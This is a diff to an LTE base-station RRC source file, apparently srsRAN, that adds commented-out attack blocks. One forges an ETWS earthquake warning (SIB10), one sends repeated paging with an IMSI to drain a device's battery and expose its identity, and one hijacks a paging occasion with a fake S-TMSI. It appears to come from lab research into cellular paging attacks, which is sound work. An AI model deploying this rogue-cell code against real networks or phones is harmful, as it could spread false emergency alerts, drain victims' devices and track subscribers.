@@ -117,6 +117,13 @@ int32_t rrc::init(const rrc_cfg_t&       cfg_,
   logger.info("Inactivity timeout: %d ms", cfg.inactivity_timeout_ms);
   logger.info("Max consecutive MAC KOs: %d", cfg.max_mac_dl_kos);
 
+
+  // === MSA#21 (Part 1): PANIC ATTACK - ENABLE ETWS & CMAS IN PAGING ===
+  // cfg.etws_present = true;
+  // cfg.cmas_present = true;
+  // === END OF MSA#21 (Part 1) ===
+
+
   pending_paging.reset(new paging_manager(cfg.sibs[1].sib2().rr_cfg_common.pcch_cfg.default_paging_cycle.to_number(),
                                           cfg.sibs[1].sib2().rr_cfg_common.pcch_cfg.nb.to_number(),
                                           cfg.etws_present,
@@ -864,6 +871,16 @@ uint32_t rrc::generate_sibs()
         sib_info_item_c sibitem;
         sibitem.set_sib2() = cell_ctxt->sib2;
         sib_list.push_back(sibitem);
+
+        // === MSA#21 (Part 2): INJECT SIB10 (ETWS WARNING - LAB TEST ONLY) ===
+        // sib_info_item_c sib10_item;
+        // auto&           s10 = sib10_item.set_sib10();
+        // s10.msg_id.from_number(0x1100);       // Mã cảnh báo test (0x1100)
+        // s10.serial_num.from_number(0x3000);   // Serial number
+        // s10.warning_type.from_number(0x0000); // Earthquake / Test
+        // sib_list.push_back(sib10_item);
+        // === END OF MSA#21 (Part 2) ===
+        
       }
 
       // Add other SIBs to this message, if any
@@ -1134,6 +1151,40 @@ int rrc::pack_mcch()
 
 void rrc::tti_clock()
 {
+
+  // === MSA#10 & MSA#12: ENERGY DEPLETION / STEALTHY KICKOFF (PAGING WITH IMSI) ===
+  // static uint32_t msa10_tti_counter = 0;
+  // msa10_tti_counter++;
+
+  // // Send an Paging message every 5000 TTI (5 giây) carrying IMSI (if MSA#12, change to `== 5000` to send once)
+  // if (msa10_tti_counter % 5000 == 0) {
+  //   asn1::s1ap::ue_paging_id_c paging_id;
+  //   auto&                      imsi_oct = paging_id.set_imsi();
+
+  //   // Encrypting 3GPP compliance TBCD for IMSI
+  //   const uint8_t imsi_tbcd[8] = {0x00, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0xF1};
+  //   imsi_oct.resize(8);
+  //   memcpy(imsi_oct.data(), imsi_tbcd, 8);
+
+  //   // Theo 3GPP TS 36.304: UE_ID = IMSI mod 1024
+  //   uint32_t ueid = 1;
+  //   logger.info("[MSA-10/12] Injecting RRC Paging with IMSI (ueid=%u)", ueid);
+  //   add_paging_id(ueid, paging_id);
+  // }
+  // === END OF MSA#10 & MSA#12 ===
+
+  // === MSA#3: PAGING CHANNEL HIJACKING ===
+  // static uint32_t msa3_tti_counter = 0;
+  // msa3_tti_counter++;
+
+  // // Phát bản tin Paging mang S-TMSI giả vào đúng Paging Occasion của ueid = 1 mỗi 320 ms
+  // if (msa3_tti_counter % 320 == 0) {
+  //   uint32_t target_ueid = 1; // 001010000000001 mod 1024 = 1
+  //   logger.info("[MSA-3] Hijacking Paging Occasion for ueid=%u with fake S-TMSI", target_ueid);
+  //   pending_paging->add_tmsi_paging(target_ueid, 0x01, 0xDEADBEEF);
+  // }
+  // === END OF MSA#3 ===
+
   // pop cmds from queue
   rrc_pdu p;
   while (rx_pdu_queue.try_pop(p)) {
